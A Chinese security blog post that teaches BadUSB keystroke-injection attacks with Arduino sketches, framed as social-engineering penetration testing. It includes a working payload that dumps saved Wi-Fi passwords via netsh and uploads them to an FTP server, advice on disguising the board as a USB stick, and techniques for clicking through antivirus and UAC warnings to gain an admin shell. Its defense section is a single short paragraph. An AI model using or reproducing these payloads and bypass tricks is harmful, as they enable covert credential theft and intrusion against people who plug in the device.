> 原文链接: https://www.anquanke.com//post/id/175519 


# BadUSB攻防研究浅谈


                                阅读量   
                                **332995**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">6</a>
                                </b>
                                                                                    



[![](https://p0.ssl.qhimg.com/t014bebb8c02e8c1bc5.jpg)](https://p0.ssl.qhimg.com/t014bebb8c02e8c1bc5.jpg)

## 序言

随着”网络强国战略”的实施，越来越多的企业着重网络安全的建设，企业在维护企业网络安全上煞费苦心，开发人员定期的进行安全开发培训，尽可能的减少在软件开发时期漏洞的产生，还通过添加硬件防火墙，入侵检测系统、防御系统等安全设备防御外部对企业的威胁，这些有效的手段即增强了企业网络的安全性，但是也导致现在的Web渗透测试难度越发提高。即使代码层面存在着高风险漏洞，但是由于安全设备的介入，仍给测试人员一头重击，导致了『无从下手』的尴尬处地。如果需要进一步的对目标进行安全检测，便只能在其它方面进行安全测试，比如社工攻击测试。本文会介绍Web攻击以外的一种攻击测试手法，社工攻击中的badusb攻击。

## 简介

社工攻击：全称社会工程学攻击，主要通过心理弱点、本能反应、好奇心、信任、贪婪等一些心理陷阱进行的诸如欺骗、伤害、信息盗取、利益谋取的行为。以信息泄露事件为例。信息泄露的原因不只是由于网络入侵方面，还有另外一种威胁，这种威胁不是技术层面导致的，而是来自可能得企业人为泄露，如误操作，被恶意攻击人员，钓鱼等等。而这种不属于技术层面的攻击便就是社工攻击。

BadUSB是利用伪造HID设备执行攻击载荷的一种攻击方式。HID设备通常指的就是键盘鼠标等与人交互的设备，用户插入BadUSB，就会自动执行预置在固件中的恶意代码，如下载服务器上的恶意文件，执行恶意操作等。由于恶意代码内置于设备初始化固件中，而不是通过autorun.inf等媒体自动播放文件进行控制，因此无法通过禁用媒体自动播放进行防御，杀毒软件更是无法检测设备固件中的恶意代码。

本文会详细的介绍下BadUSB的一些原理，代码详解，以及制作方法，先看一下固件中的代码形式，一个简单的小demo，执行结果为打开cmd命令框。



```
#include &lt;Keyboard.h&gt;

void setup() `{`

Keyboard.begin();

delay(1000);

Keyboard.press(KEY_LEFT_GUI);

Keyboard.press('r');

delay(500);

Keyboard.release(KEY_LEFT_GUI);

Keyboard.release('r');

delay(500);

Keyboard.println("CMD");

Keyboard.press(KEY_RETURN);

Keyboard.release(KEY_RETURN);

Keyboard.end();

`}`

void loop()

`{``}`
```

讲解这个小demo代码原理。



```
#include &lt;Keyboard.h&gt;

void setup() `{`

`}`

void loop()//循环

`{``}`
```

首先这一部分代码为固定代码，主要是导入键值库，然后分void setup，void loop两部分，分别代表执行一次，以及循环执行。



```
Keyboard.begin();

Keyboard.press(KEY_LEFT_GUI);

Keyboard.press('r');

delay(500);

Keyboard.release(KEY_LEFT_GUI);

Keyboard.release('r');

delay(500);

Keyboard.println("CMD");

Keyboard.press(KEY_RETURN);

Keyboard.release(KEY_RETURN);

Keyboard.end();
```

这一部分只要为执行代码，首先介绍下再第一部分引入的keyboard库，常见的API如下：

```
Keyboard.begin()，开启键盘通讯

Keyboard.end()，关闭键盘通讯

Keyboard.press()，按住某键

Keyboard.println()，输入字符

Keyboard.release()，释放某键

delay()，暂停多少毫秒
```

解释下delay()，在执行Keyboard动作之后，应适当插入delay(),以防止因为主机问题出现的延迟导致程序无法执行。

再次览读第二部分代码，首先开启键盘通讯，按压KEY_LEFT_GUI键，KEY_LEFT_GUI该键位对应的键为键盘上的WIN键，再按压R键，释放全部按键，此时执行效果为WIN+R打开了运行框，随即输入了CMD，再次按压回车键，释放回车键，关闭键盘通讯。此时的执行效果为再运行框输入CMD后按回车，打开CMD命令框。

[![](https://p1.ssl.qhimg.com/t010a9238c4a701b906.png)](https://p1.ssl.qhimg.com/t010a9238c4a701b906.png)

看一下效果图：

[![](https://p1.ssl.qhimg.com/t019990a960ce1963ea.gif)](https://p1.ssl.qhimg.com/t019990a960ce1963ea.gif)

接下来再分享一个小demo，实现的功能主要是获取电脑保存的wifi密码信息

```
#include &lt;Keyboard.h&gt;

void setup() `{`

Keyboard.begin();

delay(500);

Keyboard.press(KEY_LEFT_GUI);

Keyboard.press('r');

delay(500);

Keyboard.release(KEY_LEFT_GUI);

Keyboard.release('r');

delay(500);

Keyboard.println("CMD");

Keyboard.press(KEY_RETURN);

Keyboard.release(KEY_RETURN);

delay(500);

Keyboard.print(F("for /f \"skip=9 tokens=1,2 delims=:\" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear &gt;&gt;d:/wifi.txt"));

Keyboard.press(KEY_RETURN);

Keyboard.release(KEY_RETURN);

delay(500);

Keyboard.print(F("ftp FTP地址"));

Keyboard.press(KEY_RETURN);

Keyboard.release(KEY_RETURN);

delay(500);

Keyboard.print(F("username"));

Keyboard.press(KEY_RETURN);

Keyboard.release(KEY_RETURN);

delay(500);

Keyboard.print(F("password"));

Keyboard.press(KEY_RETURN);

Keyboard.release(KEY_RETURN);

delay(500);

Keyboard.print(F("put d:/wifi.txt"));

Keyboard.press(KEY_RETURN);

Keyboard.release(KEY_RETURN);

delay(500);

Keyboard.print(F("bye"));

Keyboard.press(KEY_RETURN);

Keyboard.release(KEY_RETURN);

delay(500);

Keyboard.print(F("exit"));

Keyboard.press(KEY_RETURN);

Keyboard.release(KEY_RETURN);

Keyboard.end();

`}`

void loop()

`{``}`
```

介绍下以上代码的执行过程以及结果，首先调用运行框调取命令框，输入以下代码。

```
for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear &gt;&gt;d:/wifi.txt
```

这段代码主要的目的是获取保存在电脑中的wifi信息并保存为wifi.txt文本。接下来再通过命令行下利用FTP上传这个文件到指定的FTP服务器，完成密码的获取上传。

通过上面的两个demo可以发现，BadUSB可以实现理论上键盘上可执行的任何操作，比如远程下载木马，获取目标权限，文件窃取等。上面的demo是针对Windows进行攻击，BadUSB除了可对Windows有效，还对MacOS，Linux等均有效。

下面在展示一个针对MacOS的利用脚本,首先Windows和MacOS的调取命令行不同，Windows调用命令行的是win+R，调用运行窗体，输入CMD回车即可打开终端。MacOS调用命令行是Command+空格，这个是mac的聚焦搜索。通过该功能可查询电脑内的功能app，输入Terminal.app，回车可直接进入命令行。还有另外一种方式，比较复杂，但是还可以达到效果，代码如下：



```
#include &lt;Keyboard.h&gt;

void setup() `{`

Keyboard.begin();

delay(1000);

Keyboard.press(KEY_LEFT_GUI);

Keyboard.press('q');

delay(100);

Keyboard.release('q');

Keyboard.release(KEY_LEFT_GUI);

delay(100);

Keyboard.press(KEY_RETURN);

Keyboard.release(KEY_RETURN);

delay(100);

Keyboard.press(KEY_LEFT_GUI);

Keyboard.press('q');

delay(100);

Keyboard.release('q');

Keyboard.release(KEY_LEFT_GUI);

delay(100);

Keyboard.press(KEY_RETURN);

Keyboard.release(KEY_RETURN);

delay(100);

Keyboard.press(KEY_LEFT_GUI);

Keyboard.press('f');

delay(100);

Keyboard.release('f');

Keyboard.release(KEY_LEFT_GUI);

delay(200);

Keyboard.println("TERMINAL.APP");

delay(100);

Keyboard.press(KEY_TAB);

Keyboard.release(KEY_TAB);

delay(200);

Keyboard.press('1');

Keyboard.release('1');

delay(100);

Keyboard.press(KEY_LEFT_GUI);

Keyboard.press('o');

delay(100);

Keyboard.release('o');

Keyboard.release(KEY_LEFT_GUI);

delay(200);

Keyboard.println("WHOAMI");

delay(100);

Keyboard.press(KEY_RETURN);

Keyboard.release(KEY_RETURN);

Keyboard.end();

`}`

void loop()

`{``}`
```

解释下这段代码，首先执行Command+q关闭当前窗口，防止多窗口关闭需要确认，所以执行了回车键，如没有开启的界面，该操作不影响程序的运行。接下来调用了访达的查询命令Command+f，输入需要查询的app。

[![](https://p3.ssl.qhimg.com/t019ea681e6c2b84482.png)](https://p3.ssl.qhimg.com/t019ea681e6c2b84482.png)

这是需要按一下TAB键，进行选中，再次输入一个’1’，即可选中当前的终端.app，再执行Command+o便可以打开终端。效果图如下：

[![](https://p1.ssl.qhimg.com/t015d5425a6db9460e6.gif)](https://p1.ssl.qhimg.com/t015d5425a6db9460e6.gif)

Linux桌面版的调用终端，以CentOS为例，按住键盘win键+t可调出查询窗体，输入终端信息，回车即可打开终端

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t014876870c333b96d4.png)

如果是linux命令行版的就更方便了，可直接Keyboard.println()进行命令的输入等。

制作：

讲解了如何构造代码，接下来就讲一下如何制作BadUSB，BadUSB制作的材料主要是Arduino开发板，以及Arduino的开发工具。

首先开发板可直接在某宝上进行购买，分单片版以及仿USB版。至于差别呢就是一个套上了USB的壳子，使得在外形上更具有迷惑性。

[![](https://p0.ssl.qhimg.com/t012924ae75607b8d5e.png)](https://p0.ssl.qhimg.com/t012924ae75607b8d5e.png)

开发工具为Arduino，可在官网进行下载，界面如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01e6d7682b1e0ebab3.png)

首先需要确定购买的开发版信息，插入开发板，点击工具-获取开发板信息

[![](https://p1.ssl.qhimg.com/t01014d7c54c7198b59.png)](https://p1.ssl.qhimg.com/t01014d7c54c7198b59.png)

根据提示的信息选择开发模式类型，点击工具-开发板

[![](https://p1.ssl.qhimg.com/t01853785de1d6a9ed0.png)](https://p1.ssl.qhimg.com/t01853785de1d6a9ed0.png)

再次选择编程器，点击工具-编程器选用USBasp

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01dfaa46a9ba243689.png)

接下来将程序写入代码框内，先选择1验证代码，在选择2上传代码

[![](https://p2.ssl.qhimg.com/t0187def1193f983f81.png)](https://p2.ssl.qhimg.com/t0187def1193f983f81.png)

上传结束后，一个BadUSB就制作完成了。

## 问题解疑

由于代码上面的代码只是简单的执行了指定的动作或者输入，如果某一步执行失败后面的代码均无法执行，导致BadUSB的失效。以及一些安全软件会根据执行的动作阻碍脚本执行。如脚本执行了远程下载命令，某数字防护软件便会提示疑似的风险行为。主要遇到的问题如下：

问题1.电脑默认输入法为汉字，输入命令时真实输入的为汉字，影响命令执行？

解答：如果默认输入法为汉字输入法，可调用再输入命令前先执行按压大写键，这样即使是输入法为汉字也能输入大写的命令，而Windows命令行大写命令也可以识别。MacOS，Linux桌面版等同，Linux命令行版很少存在输入法问题。

问题2：如果电脑不管是默认的汉字输入法，且大写功能已经开启，而上面的大写键又取消了大写功能，输入的还是乱码？

解答：还是用上面的办法去进行绕过，不过才用的是键盘的快捷操作，按住shift再加上输入的命令，不管是在大写功能开启与否的状态，还是汉字输入法启用与否的情况下都可以完成大写的命令输入。

问题3：由于电脑的性能问题，导致命令行窗口还未打开，命令就执行结束了，导致操作的失败？

解答：这个问题可以合理的设置按键后的delay(毫秒)值

问题4：安全软件的虽然无法阻止BadUSB的执行，但是执行某exe文件或者执行远程下载文件命令时会提示警告，或者执行EXE文件时权限可能是不够，所以会弹出UAC警告，会影响程序的执行，如下图？

[![](https://p4.ssl.qhimg.com/t011fb066c21edfcf45.png)](https://p4.ssl.qhimg.com/t011fb066c21edfcf45.png)

[![](https://p5.ssl.qhimg.com/t01b964069a728fc0be.png)](https://p5.ssl.qhimg.com/t01b964069a728fc0be.png)

解答：通常安全软件或者UAC的提醒通常的默认选项实在”否”的按键上，可通过调用键盘的方向右键或者SHIFT+TAB再点击回车进行绕过，这两个操作在代码层次上不会影响代码的执行。针对UAC，还可以以管理员权限开启CMD进行绕过。方法是先按下Win键会弹出开始菜单界面，然后直接输入cmd.exe，开始界面会自动搜寻出系统的cmd应用程序，这时候使同时按下CTRL+SHIFT+ENTER 就会弹出UAC的确认界面，然后再用ALT+Y 就能打开一个具有管理员权限的Cmd窗口。

## 防御

上文中说到，由于恶意代码内置于设备初始化固件中，而不是通过autorun.inf等媒体自动播放文件进行控制，因此无法通过禁用媒体自动播放进行防御，杀毒软件更是无法检测设备固件中的恶意代码。目前也没有什么有效的方式去防御BadUSB，毕竟无法阻挡电脑去识别键盘鼠标此类的HID设备。所以说针对BadUSB的防御方法还是在于人员的安全意识上，当发现可疑的U盘时切莫因好奇插入自己的电脑

## 警告

本实验仅供研究测试，严禁用此执行任何非法操作。云众可信提醒您：

道路千万条，自律第一条，做事不规范，亲人两行泪。
